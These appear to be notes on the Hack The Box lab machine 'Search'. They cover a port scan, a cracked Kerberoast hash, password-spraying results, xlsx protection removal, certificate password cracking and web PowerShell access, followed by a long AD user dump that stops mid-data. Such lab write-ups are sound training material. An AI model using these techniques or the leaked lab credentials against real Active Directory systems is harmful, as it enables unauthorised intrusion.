# Search

Difficulty: 7
Tags: Active Directory, DSInternals, Powershell, Web, kerbrute, ldapdomaindump, p12 cracking, password spraying, rpcclient-user-enum, ssl certificates
Type: Windows

# Enumeration

portscan 

```bash
PORT      STATE SERVICE       VERSION                                                                                                                                                                                             
53/tcp    open  domain        Simple DNS Plus                                                                                                                                                                                     
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                                                                                            
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                                                          
|_http-title: Search &mdash; Just Testing IIS                                                                                                                                                                                     
| http-methods:                                                                                                                                                                                                                   
|_  Potentially risky methods: TRACE                                                                                                                                                                                              
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-23 04:19:56Z)                                                                                                                                      
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                                                               
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                                       
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)                                                                                                       
|_ssl-date: 2021-12-23T04:21:30+00:00; +2s from scanner time.                                                                                                                                                                     
| ssl-cert: Subject: commonName=research                                                                                                                                                                                          
| Not valid before: 2020-08-11T08:13:35                                                                                                                                                                                           
|_Not valid after:  2030-08-09T08:13:35                                                                                                                                                                                           
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0                                                                                                                                                                            
| http-methods:                                                                                                                                                                                                                   
|_  Potentially risky methods: TRACE                                                                                                                                                                                              
| ssl-cert: Subject: commonName=research                                                                                                                                                                                          
| Not valid before: 2020-08-11T08:13:35                                                                                                                                                                                           
|_Not valid after:  2030-08-09T08:13:35                                                                                                                                                                                           
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2021-12-23T04:21:30+00:00; +2s from scanner time.
|_http-title: Search &mdash; Just Testing IIS
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2021-12-23T04:21:30+00:00; +2s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2021-12-23T04:21:30+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2021-12-23T04:21:32+00:00; +1s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2021-12-23T04:21:32+00:00; +1s from scanner time.
|_http-title: Site doesn't have a title.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
52519/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-12-23T04:20:55
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
```

- http://search.htb/main.html

![Untitled](Search%20a97d63e6ba4148dfb5fe67b531374466/Untitled.png)

- Found two subdomains → portal.search.htb research.search.htb both looked similar to search.htb

![slide_2.jpg](Search%20a97d63e6ba4148dfb5fe67b531374466/slide_2.jpg)

- Found possible username - password combination
    - “[hope.sharp](http://hope.sharp)” : “IsolationIsKey?”
- used these to successfully login to smb
- Found several files inside CertEnroll file share
    - cat nsrev_search-RESEARCH-CA.asp
    
    ```
    <%
    Response.ContentType = "application/x-netscape-revocation"
    serialnumber = Request.QueryString
    set Admin = Server.CreateObject("CertificateAuthority.Admin")
    
    stat = Admin.IsValidCertificate("Research.search.htb\search-RESEARCH-CA", serialnumber)
    
    if stat = 3 then Response.Write("0") else Response.Write("1") end if
    %>
    ```
    
    - Other three files are executables, probably binary files

![Untitled](Search%20a97d63e6ba4148dfb5fe67b531374466/Untitled%201.png)

- Potential users
- created a wordlist and enumerated users

![Untitled](Search%20a97d63e6ba4148dfb5fe67b531374466/Untitled%202.png)

![search-svc-hash.png](Search%20a97d63e6ba4148dfb5fe67b531374466/search-svc-hash.png)

- Cracked web_svc password hash

```
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$7cf20851990ae4e7d863effd8d1c7cde$aff43eb0d2ce4fb2cf56f6afdb745daff695c2a23b72feaae274f7cd06d37569642066362191a52a90bc5f8b1c2731360030975b28dadd9b494649817f3fd1f7ceaea2ae631973022da15fce526ab61580aef9109015a2ebafbec8b243d9f5d2969f1f321729289680330004dd2d28cb09c8e3135a420fd6d84d5c2148431456dc2f812853ab3d5c52e87cea1a83d5c308557a2829b1d34865d6955f105f5d861c0cd259380c247d9f1736ff7a4eba7842a0c032e1307e26c4c832c1804267f42002e8987d533e737c06eed1142ca4307219daca4150c7374106fbbaf10b321012874cacab6c99f97ae050a77fe814339cc4f3a50a86043a88211e2deb6490997ceda9b8287e66275d4a4e52ffcce5360ca4e6038e26444054b54786178f61c17d491272689361f451a5484c061ac75ec3031ba7f6005e7872d03dd179a505c765ff48632e9177288450b90677a066f333348f007c883e857fd0b349b4890d409a8917516d5418d1086e13c6d85b1202a12b169c2cf622adaf4a8042ee3cfea156b73d150a00473bbbccd6a27a308653480e0cc062b316cbfb9b8fd5461c1050f04995e1a329cda42e90a3c6c0f5d46b5dc3a5eaf668fc9e8cfceafe28b6b0ba40bf77ba78e5dd215aa4a7d8014f48ca45a07652ce9a2dca7bc0bdfc85424e61a4f532b06fac9314e79221b8b3df967787f651d97ffc8f60f6ed5bbbf858b495f59574d21aaf88257d5f5a2285f01e94c9b8a3b1fa3b58064f519709b0724fb0e602bb7dc4215e134e84d20adda72d567fac40fa8d31f1268c46b34d05ac5848f885774e16a02e92951097046507fc26e00d612000294f087e38ef2eb209d0c8018772d0c62234925a158abb4932c7aeb0453365e3ad848a1c66bd6d65ec1beac57b5e5f6f55f735484c765d090de7321ccc4bd746038fd77655185133bfaa77c9314859f4fe47906d972860e1eeab9849ad5c9b1361cceb9c91782a6e252ded2239d306ccd178c4f92e102ad40678586f3d3128b6ecc6bccc4da2deb2879c41bfb04a1be60f3e93baac76127327768b3b72c3ca499ef646974db8a932f9ef90a6bbecb04d67cd4017691edb17c5c1be49bd1baa3956b43083e3f55823c503a1ef165ed19d0c750d83582672e1a70a2f13eaf305271ed574363eff714ab0695b582bc40f39f733bec97a2844c508909cb93340a9a1675d92f68fd705fae80d1faabfb579593379d5481a9bd0f104711d7ec5cf9d3d5fba627690dda7aba01ee7f94f5aa3c664896d4d3d98462526528213cc4b74b84b0d6f9c1ce869d9737282c578abb35c1fbfdaca0d94b0ee36b873ad6445ebbcd8da03f94760c7b92e3277935e8ac1973562611509530bc97639d46a4d043c247cdd24740fa5e72769716fd9ce5e2b4c529bcfff070a1e82908a1177fc14d9170852e5a4985da3fa59753507f508645495395b280bb53d27af5308689abb57dd:@3ONEmillionbaby
```

![cracked-svc-passwd.png](Search%20a97d63e6ba4148dfb5fe67b531374466/cracked-svc-passwd.png)

- Password spraying with web_svc password

```
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Frederick.Cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Marshall.Skinner:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Elisha.Watts:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Belen.Compton:@3ONEmillionbaby STATUS_LOGON_FAILURE
```

```powershell
web_svc:@3ONEmillionbaby
edgar.jacobs:@3ONEmillionbaby
```

- found an .xlsx file inside Edgar.Jacobs\Desktop
- The column is protected in the XLS
- change the file extension to zip
- unzip the file
- remove the protection from the xml file & rezip it
- rename it to xls, then re open it in excel.

```
sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18
```

# Initial Access

- Read this to get meterpreter shell from crackmapexec

[KSEC ARK - Pentesting and redteam knowledge base | CrackMapExec - Meterpreter shell](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-meterpreter/)

- used this tool to crack the certificate’s password

[https://github.com/Ridter/p12tool](https://github.com/Ridter/p12tool)

password : `misspissy`

- upload the certs and head over to [https://search.htb/staff](https://search.htb/staff) and login using sierra.frye’s credentials to get a web powershell
- enumerating the current user

```powershell
# Get-ADUser -Identity sierra.frye -Properties * 

distinguishedName : CN=Birmingham-ITSec,OU=Groups,OU=Birmingham,OU=Sites,DC=search,DC=htb

GroupCategory     : Security

GroupScope        : Global

name              : Birmingham-ITSec

objectClass       : group

objectGUID        : ab69deda-aa9f-4a79-a2fc-44d44f7a67ab

SamAccountName    : Birmingham-ITSec

SID               : S-1-5-21-271492789-1610487937-1871574529-1106

PasswordLastSet                      : 4/9/2020 8:35:13 PM

PasswordNeverExpires                 : True

PasswordNotRequired                  : False

POBox                                : 

PostalCode                           : 

PrimaryGroup                         : CN=Domain Users,CN=Users,DC=search,DC=htb

primaryGroupID                       : 513

PrincipalsAllowedToDelegateToAccount : {}

ProfilePath                          : 

ProtectedFromAccidentalDeletion      : False

pwdLastSet                           : 132309345135790431

SamAccountName                       : Sierra.Frye

sAMAccountType                       : 805306368

ScriptPath                           : 

sDRightsEffective                    : 0

ServicePrincipalNames                : {}

SID                                  : S-1-5-21-271492789-1610487937-1871574529-1282

SIDHistory                           : {}

SmartcardLogonRequired               : False

sn                                   : Frye

State                                : 

StreetAddress                        : 

Surname                              : Frye

Title                                : 

TrustedForDelegation                 : False

TrustedToAuthForDelegation           : False

UseDESKeyOnly                        : False

userAccountControl                   : 66048

userCertificate                      : {48 130 6 38 48 130 5 14 160 3 2 1 2 2 19 84 0 0 0 23 193 85 144 238 237 40 52 

                                       145 0 0 0 0 0 23 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 48 74 49 19 48 17 6 

                                       10 9 146 38 137 147 242 44 100 1 25 22 3 104 116 98 49 22 48 20 6 10 9 146 38 

                                       137 147 242 44 100 1 25 22 6 115 101 97 114 99 104 49 27 48 25 6 3 85 4 3 19 18 

                                       115 101 97 114 99 104 45 82 69 83 69 65 82 67 72 45 67 65 48 30 23 13 50 49 49 

                                       50 50 56 49 51 49 54 51 50 90 23 13 51 49 49 50 50 54 49 51 49 54 51 50 90 48 

                                       120 49 19 48 17 6 10 9 146 38 137 147 242 44 100 1 25 22 3 104 116 98 49 22 48 

                                       20 6 10 9 146 38 137 147 242 44 100 1 25 22 6 115 101 97 114 99 104 49 14 48 12 

                                       6 3 85 4 11 19 5 83 105 116 101 115 49 19 48 17 6 3 85 4 11 19 10 66 105 114 

                                       109 105 110 103 104 97 109 49 14 48 12 6 3 85 4 11 19 5 85 115 101 114 115 49 

                                       20 48 18 6 3 85 4 3 19 11 83 105 101 114 114 97 32 70 114 121 101 48 130 1 34 

                                       48 13 6 9 42 134 72 134 247 13 1 1 1 5 0 3 130 1 15 0 48 130 1 10 2 130 1 1 0 

                                       149 104 160 198 87 142 133 81 28 197 62 190 180 7 95 167 97 144 89 110 213 67 

                                       157 107 233 243 217 246 133 100 94 89 100 147 244 143 187 151 155 135 155 71 42 

                                       44 243 5 190 83 159 192 24 162 198 201 195 87 163 46 128 123 188 189 5 67 209 

                                       157 231 68 72 238 20 17 182 107 15 66 9 74 13 194 133 242 121 245 148 20 177 

                                       219 244 181 118 106 9 97 150 29 161 23 31 231 120 21 131 49 203 36 220 165 119 

                                       195 9 67 156 140 111 232 217 61 122 36 199 253 72 109 13 21 246 101 166 240 68 

                                       193 224 177 111 99 91 74 159 188 120 45 241 104 72 232 127 123 144 66 99 32 31 

                                       48 38 99 89 233 210 20 166 220 62 61 53 58 204 238 56 179 51 6 197 82 41 56 62 

                                       27 75 6 57 149 236 121 15 142 167 20 134 135 121 9 95 15 113 145 148 89 66 160 

                                       210 151 160 41 14 223 179 10 199 52 73 180 175 61 11 173 10 9 177 224 188 57 

                                       232 179 30 61 13 67 185 178 57 85 104 37 192 135 72 102 53 224 126 77 65 84 40 

                                       38 110 34 168 224 46 156 189 53 191 243 2 3 1 0 1 163 130 2 213 48 130 2 209 48 

                                       49 6 3 85 29 17 4 42 48 40 160 38 6 10 43 6 1 4 1 130 55 20 2 3 160 24 12 22 83 

                                       105 101 114 114 97 46 70 114 121 101 64 115 101 97 114 99 104 46 104 116 98 48 

                                       29 6 3 85 29 14 4 22 4 20 242 158 121 181 48 168 207 255 84 185 119 160 144 98 

                                       252 29 105 37 143 204 48 31 6 3 85 29 35 4 24 48 22 128 20 106 145 173 123 40 

                                       111 181 72 166 91 56 206 188 98 170 95 231 87 236 80 48 129 208 6 3 85 29 31 4 

                                       129 200 48 129 197 48 129 194 160 129 191 160 129 188 134 129 185 108 100 97 

                                       112 58 47 47 47 67 78 61 115 101 97 114 99 104 45 82 69 83 69 65 82 67 72 45 67 

                                       65 44 67 78 61 82 101 115 101 97 114 99 104 44 67 78 61 67 68 80 44 67 78 61 80 

                                       117 98 108 105 99 37 50 48 75 101 121 37 50 48 83 101 114 118 105 99 101 115 44 

                                       67 78 61 83 101 114 118 105 99 101 115 44 67 78 61 67 111 110 102 105 103 117 

                                       114 97 116 105 111 110 44 68 67 61 115 101 97 114 99 104 44 68 67 61 104 116 98 

                                       63 99 101 114 116 105 102 105 99 97 116 101 82 101 118 111 99 97 116 105 111 

                                       110 76 105 115 116 63 98 97 115 101 63 111 98 106 101 99 116 67 108 97 115 115 

                                       61 99 82 76 68 105 115 116 114 105 98 117 116 105 111 110 80 111 105 110 116 48 

                                       129 195 6 8 43 6 1 5 5 7 1 1 4 129 182 48 129 179 48 129 176 6 8 43 6 1 5 5 7 

                                       48 2 134 129 163 108 100 97 112 58 47 47 47 67 78 61 115 101 97 114 99 104 45 

                                       82 69 83 69 65 82 67 72 45 67 65 44 67 78 61 65 73 65 44 67 78 61 80 117 98 108 

                                       105 99 37 50 48 75 101 121 37 50 48 83 101 114 118 105 99 101 115 44 67 78 61 

                                       83 101 114 118 105 99 101 115 44 67 78 61 67 111 110 102 105 103 117 114 97 116 

                                       105 111 110 44 68 67 61 115 101 97 114 99 104 44 68 67 61 104 116 98 63 99 65 

                                       67 101 114 116 105 102 105 99 97 116 101 63 98 97 115 101 63 111 98 106 101 99 

                                       116 67 108 97 115 115 61 99 101 114 116 105 102 105 99 97 116 105 111 110 65 

                                       117 116 104 111 114 105 116 121 48 14 6 3 85 29 15 1 1 255 4 4 3 2 5 160 48 59 

                                       6 9 43 6 1 4 1 130 55 21 7 4 46 48 44 6 36 43 6 1 4 1 130 55 21 8 138 171 73 

                                       132 252 188 117 165 159 27 135 131 204 92 133 146 204 49 129 105 188 243 84 134 

                                       140 254 40 2 1 100 2 1 14 48 19 6 3 85 29 37 4 12 48 10 6 8 43 6 1 5 5 7 3 2 48 

                                       27 6 9 43 6 1 4 1 130 55 21 10 4 14 48 12 48 10 6 8 43 6 1 5 5 7 3 2 48 68 6 9 

                                       42 134 72 134 247 13 1 9 15 4 55 48 53 48 14 6 8 42 134 72 134 247 13 3 2 2 2 0 

                                       128 48 14 6 8 42 134 72 134 247 13 3 4 2 2 0 128 48 7 6 5 43 14 3 2 7 48 10 6 8 

                                       42 134 72 134 247 13 3 7 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 3 130 1 1 0 

                                       84 26 134 123 46 87 254 181 152 230 20 119 48 169 152 253 93 145 177 235 181 

                                       145 254 102 213 136 174 222 253 59 78 1 164 158 183 105 214 126 236 13 131 33 

                                       49 110 168 226 232 218 183 7 146 119 246 179 114 212 244 154 244 26 250 181 75 

                                       32 124 39 161 10 72 147 164 123 224 110 64 144 157 74 201 159 21 199 105 181 12 

                                       178 215 6 221 238 110 127 196 16 111 56 201 163 209 6 254 50 148 19 231 245 21 

                                       148 125 128 110 227 159 97 52 197 97 208 119 214 147 240 209 232 124 110 200 

                                       104 46 196 220 148 202 118 42 179 29 46 28 65 166 58 87 129 97 80 134 130 32 

                                       243 213 221 239 116 122 198 208 57 174 77 87 84 245 214 211 52 48 94 90 47 139 

                                       29 234 172 40 22 41 217 213 214 154 57 1 246 99 156 28 65 25 8 210 197 38 203 

                                       143 195 201 102 234 141 169 173 115 0 165 68 206 237 21 175 53 61 138 60 30 2 

                                       67 4 142 140 168 238 209 83 207 138 78 165 229 114 8 129 41 230 6 240 72 241 27 

                                       155 208 58 221 206 73 238 1 76 218 51 118 22 255 182 121 148, 48 130 6 38 48 

                                       130 5 14 160 3 2 1 2 2 19 84 0 0 0 22 210 27 109 73 17 28 229 116 0 0 0 0 0 22 

                                       48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 48 74 49 19 48 17 6 10 9 146 38 137 

                                       147 242 44 100 1 25 22 3 104 116 98 49 22 48 20 6 10 9 146 38 137 147 242 44 

                                       100 1 25 22 6 115 101 97 114 99 104 49 27 48 25 6 3 85 4 3 19 18 115 101 97 114 

                                       99 104 45 82 69 83 69 65 82 67 72 45 67 65 48 30 23 13 50 49 49 50 50 56 49 51 

                                       49 53 52 49 90 23 13 51 49 49 50 50 54 49 51 49 53 52 49 90 48 120 49 19 48 17 

                                       6 10 9 146 38 137 147 242 44 100 1 25 22 3 104 116 98 49 22 48 20 6 10 9 146 38 

                                       137 147 242 44 100 1 25 22 6 115 101 97 114 99 104 49 14 48 12 6 3 85 4 11 19 5 

                                       83 105 116 101 115 49 19 48 17 6 3 85 4 11 19 10 66 105 114 109 105 110 103 104 

                                       97 109 49 14 48 12 6 3 85 4 11 19 5 85 115 101 114 115 49 20 48 18 6 3 85 4 3 

                                       19 11 83 105 101 114 114 97 32 70 114 121 101 48 130 1 34 48 13 6 9 42 134 72 

                                       134 247 13 1 1 1 5 0 3 130 1 15 0 48 130 1 10 2 130 1 1 0 223 82 44 210 179 151 

                                       7 52 149 65 87 211 126 95 109 64 123 194 182 180 61 59 9 32 95 180 135 175 75 

                                       211 64 152 238 74 158 163 147 0 11 106 244 126 235 186 139 252 187 251 88 8 228 

                                       166 188 107 106 81 97 50 68 234 111 83 105 210 49 239 68 244 157 218 69 91 65 

                                       10 151 152 253 219 23 217 161 58 144 163 113 249 173 204 146 20 209 242 184 178 

                                       201 97 215 116 49 132 59 83 78 109 204 201 224 42 5 240 137 68 53 128 113 161 

                                       71 68 196 188 56 111 110 219 26 111 143 210 34 187 194 167 62 24 251 181 222 

                                       125 141 234 209 212 229 225 117 107 78 65 125 179 119 107 204 165 200 95 199 67 

                                       183 57 91 230 16 15 139 108 196 247 6 240 178 135 26 29 7 204 138 90 4 65 126 

                                       121 56 97 158 89 130 5 85 103 236 245 115 157 205 96 112 49 28 170 118 11 173 

                                       95 252 184 30 246 104 178 172 64 72 220 58 54 55 41 235 49 160 121 236 5 65 95 

                                       33 100 218 39 184 29 93 214 178 35 2 230 86 187 28 167 197 215 63 247 28 56 19 

                                       52 213 136 225 208 145 5 2 3 1 0 1 163 130 2 213 48 130 2 209 48 49 6 3 85 29 

                                       17 4 42 48 40 160 38 6 10 43 6 1 4 1 130 55 20 2 3 160 24 12 22 83 105 101 114 

                                       114 97 46 70 114 121 101 64 115 101 97 114 99 104 46 104 116 98 48 29 6 3 85 29 

                                       14 4 22 4 20 31 72 186 54 70 35 24 68 153 14 44 37 80 220 44 185 183 210 204 46 

                                       48 31 6 3 85 29 35 4 24 48 22 128 20 106 145 173 123 40 111 181 72 166 91 56 

                                       206 188 98 170 95 231 87 236 80 48 129 208 6 3 85 29 31 4 129 200 48 129 197 48 

                                       129 194 160 129 191 160 129 188 134 129 185 108 100 97 112 58 47 47 47 67 78 61 

                                       115 101 97 114 99 104 45 82 69 83 69 65 82 67 72 45 67 65 44 67 78 61 82 101 

                                       115 101 97 114 99 104 44 67 78 61 67 68 80 44 67 78 61 80 117 98 108 105 99 37 

                                       50 48 75 101 121 37 50 48 83 101 114 118 105 99 101 115 44 67 78 61 83 101 114 

                                       118 105 99 101 115 44 67 78 61 67 111 110 102 105 103 117 114 97 116 105 111 

                                       110 44 68 67 61 115 101 97 114 99 104 44 68 67 61 104 116 98 63 99 101 114 116 

                                       105 102 105 99 97 116 101 82 101 118 111 99 97 116 105 111 110 76 105 115 116 

                                       63 98 97 115 101 63 111 98 106 101 99 116 67 108 97 115 115 61 99 82 76 68 105 

                                       115 116 114 105 98 117 116 105 111 110 80 111 105 110 116 48 129 195 6 8 43 6 1 

                                       5 5 7 1 1 4 129 182 48 129 179 48 129 176 6 8 43 6 1 5 5 7 48 2 134 129 163 108 

                                       100 97 112 58 47 47 47 67 78 61 115 101 97 114 99 104 45 82 69 83 69 65 82 67 

                                       72 45 67 65 44 67 78 61 65 73 65 44 67 78 61 80 117 98 108 105 99 37 50 48 75 

                                       101 121 37 50 48 83 101 114 118 105 99 101 115 44 67 78 61 83 101 114 118 105 

                                       99 101 115 44 67 78 61 67 111 110 102 105 103 117 114 97 116 105 111 110 44 68 

                                       67 61 115 101 97 114 99 104 44 68 67 61 104 116 98 63 99 65 67 101 114 116 105 

                                       102 105 99 97 116 101 63 98 97 115 101 63 111 98 106 101 99 116 67 108 97 115 

                                       115 61 99 101 114 116 105 102 105 99 97 116 105 111 110 65 117 116 104 111 114 

                                       105 116 121 48 14 6 3 85 29 15 1 1 255 4 4 3 2 5 160 48 59 6 9 43 6 1 4 1 130 

                                       55 21 7 4 46 48 44 6 36 43 6 1 4 1 130 55 21 8 138 171 73 132 252 188 117 165 

                                       159 27 135 131 204 92 133 146 204 49 129 105 188 243 84 134 140 254 40 2 1 100 

                                       2 1 14 48 19 6 3 85 29 37 4 12 48 10 6 8 43 6 1 5 5 7 3 2 48 27 6 9 43 6 1 4 1 

                                       130 55 21 10 4 14 48 12 48 10 6 8 43 6 1 5 5 7 3 2 48 68 6 9 42 134 72 134 247 

                                       13 1 9 15 4 55 48 53 48 14 6 8 42 134 72 134 247 13 3 2 2 2 0 128 48 14 6 8 42 

                                       134 72 134 247 13 3 4 2 2 0 128 48 7 6 5 43 14 3 2 7 48 10 6 8 42 134 72 134 

                                       247 13 3 7 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 3 130 1 1 0 77 76 167 196 

                                       126 101 69 235 142 21 79 147 3 123 51 170 209 85 133 121 186 64 81 212 243 221 

                                       193 147 228 158 179 98 150 32 203 245 158 132 49 15 176 240 166 219 60 160 185 

                                       37 121 35 9 254 223 201 33 35 19 85 79 60 73 190 243 219 171 216 215 239 55 43 

                                       152 141 33 180 164 37 153 148 130 108 176 4 15 144 85 208 229 221 8 91 70 245 

                                       11 20 237 39 36 171 30 97 242 60 43 99 11 220 88 74 92 211 117 208 250 235 121 

                                       69 224 79 28 118 79 121 214 219 214 24 132 193 216 51 60 131 186 202 61 7 250 

                                       78 141 111 119 187 35 234 33 69 141 219 85 111 168 92 241 193 96 156 69 35 158 

                                       57 69 32 195 143 54 170 212 232 222 15 77 102 8 221 149 47 123 53 21 73 2 95 

                                       150 24 110 5 192 69 124 228 192 216 166 206 225 181 208 168 224 70 141 76 60 

                                       110 210 246 212 254 234 51 156 147 17 165 216 57 0 191 163 72 30 209 2 29 4 212 

                                       17 123 213 174 197 4 14 203 241 13 215 195 127 196 70 135 7 155 83 59 126 22 76 

                                       21 23 182 66 145 10 101, 48 130 6 38 48 130 5 14 160 3 2 1 2 2 19 84 0 0 0 16 6 

                                       54 68 30 54 58 121 237 0 0 0 0 0 16 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 

                                       48 74 49 19 48 17 6 10 9 146 38 137 147 242 44 100 1 25 22 3 104 116 98 49 22 

                                       48 20 6 10 9 146 38 137 147 242 44 100 1 25 22 6 115 101 97 114 99 104 49 27 48 

                                       25 6 3 85 4 3 19 18 115 101 97 114 99 104 45 82 69 83 69 65 82 67 72 45 67 65 

                                       48 30 23 13 50 48 48 56 49 48 50 48 50 55 49 52 90 23 13 51 48 48 56 48 56 50 

                                       48 50 55 49 52 90 48 120 49 19 48 17 6 10 9 146 38 137 147 242 44 100 1 25 22 3 

                                       104 116 98 49 22 48 20 6 10 9 146 38 137 147 242 44 100 1 25 22 6 115 101 97 

                                       114 99 104 49 14 48 12 6 3 85 4 11 19 5 83 105 116 101 115 49 19 48 17 6 3 85 4 

                                       11 19 10 66 105 114 109 105 110 103 104 97 109 49 14 48 12 6 3 85 4 11 19 5 85 

                                       115 101 114 115 49 20 48 18 6 3 85 4 3 19 11 83 105 101 114 114 97 32 70 114 

                                       121 101 48 130 1 34 48 13 6 9 42 134 72 134 247 13 1 1 1 5 0 3 130 1 15 0 48 

                                       130 1 10 2 130 1 1 0 223 30 28 192 30 90 220 197 237 135 179 175 29 4 38 14 147 

                                       94 229 114 85 93 39 155 176 56 10 235 192 57 128 18 141 24 40 201 224 232 11 

                                       239 167 21 117 6 45 98 208 135 228 214 29 227 115 226 49 167 145 58 90 58 215 

                                       78 22 46 36 36 76 14 20 26 13 149 213 206 40 61 45 69 235 60 58 80 27 33 43 101 

                                       69 163 225 133 246 167 35 78 221 186 50 237 26 210 244 152 174 103 48 94 65 121 

                                       230 175 83 20 7 16 59 206 149 149 103 2 17 170 38 194 142 212 198 39 252 191 

                                       188 109 204 22 129 21 87 4 121 23 109 112 118 171 165 9 51 231 198 171 247 110 

                                       245 54 204 212 251 17 201 202 198 98 187 60 237 248 100 21 235 135 101 205 246 

                                       118 83 250 109 8 64 23 208 45 186 75 89 12 216 22 240 222 146 6 162 248 53 200 

                                       60 146 92 142 181 8 188 85 179 40 132 86 3 125 215 190 218 5 118 92 151 59 242 

                                       66 113 53 75 196 241 23 227 194 4 96 210 215 133 111 67 19 198 220 154 223 60 

                                       130 158 224 86 70 240 208 98 150 110 69 43 23 142 193 2 3 1 0 1 163 130 2 213 

                                       48 130 2 209 48 59 6 9 43 6 1 4 1 130 55 21 7 4 46 48 44 6 36 43 6 1 4 1 130 55 

                                       21 8 138 171 73 132 252 188 117 165 159 27 135 131 204 92 133 146 204 49 129 

                                       105 188 243 84 134 140 254 40 2 1 100 2 1 14 48 19 6 3 85 29 37 4 12 48 10 6 8 

                                       43 6 1 5 5 7 3 2 48 14 6 3 85 29 15 1 1 255 4 4 3 2 5 160 48 27 6 9 43 6 1 4 1 

                                       130 55 21 10 4 14 48 12 48 10 6 8 43 6 1 5 5 7 3 2 48 68 6 9 42 134 72 134 247 

                                       13 1 9 15 4 55 48 53 48 14 6 8 42 134 72 134 247 13 3 2 2 2 0 128 48 14 6 8 42 

                                       134 72 134 247 13 3 4 2 2 0 128 48 7 6 5 43 14 3 2 7 48 10 6 8 42 134 72 134 

                                       247 13 3 7 48 29 6 3 85 29 14 4 22 4 20 13 146 226 121 8 250 211 160 149 162 

                                       121 51 207 121 165 145 241 196 225 237 48 31 6 3 85 29 35 4 24 48 22 128 20 106 

                                       145 173 123 40 111 181 72 166 91 56 206 188 98 170 95 231 87 236 80 48 129 208 

                                       6 3 85 29 31 4 129 200 48 129 197 48 129 194 160 129 191 160 129 188 134 129 

                                       185 108 100 97 112 58 47 47 47 67 78 61 115 101 97 114 99 104 45 82 69 83 69 65 

                                       82 67 72 45 67 65 44 67 78 61 82 101 115 101 97 114 99 104 44 67 78 61 67 68 80 

                                       44 67 78 61 80 117 98 108 105 99 37 50 48 75 101 121 37 50 48 83 101 114 118 

                                       105 99 101 115 44 67 78 61 83 101 114 118 105 99 101 115 44 67 78 61 67 111 110 

                                       102 105 103 117 114 97 116 105 111 110 44 68 67 61 115 101 97 114 99 104 44 68 

                                       67 61 104 116 98 63 99 101 114 116 105 102 105 99 97 116 101 82 101 118 111 99 

                                       97 116 105 111 110 76 105 115 116 63 98 97 115 101 63 111 98 106 101 99 116 67 

                                       108 97 115 115 61 99 82 76 68 105 115 116 114 105 98 117 116 105 111 110 80 111 

                                       105 110 116 48 129 195 6 8 43 6 1 5 5 7 1 1 4 129 182 48 129 179 48 129 176 6 8 

                                       43 6 1 5 5 7 48 2 134 129 163 108 100 97 112 58 47 47 47 67 78 61 115 101 97 

                                       114 99 104 45 82 69 83 69 65 82 67 72 45 67 65 44 67 78 61 65 73 65 44 67 78 61 

                                       80 117 98 108 105 99 37 50 48 75 101 121 37 50 48 83 101 114 118 105 99 101 115 

                                       44 67 78 61 83 101 114 118 105 99 101 115 44 67 78 61 67 111 110 102 105 103 

                                       117 114 97 116 105 111 110 44 68 67 61 115 101 97 114 99 104 44 68 67 61 104 

                                       116 98 63 99 65 67 101 114 116 105 102 105 99 97 116 101 63 98 97 115 101 63 

                                       111 98 106 101 99 116 67 108 97 115 115 61 99 101 114 116 105 102 105 99 97 116 

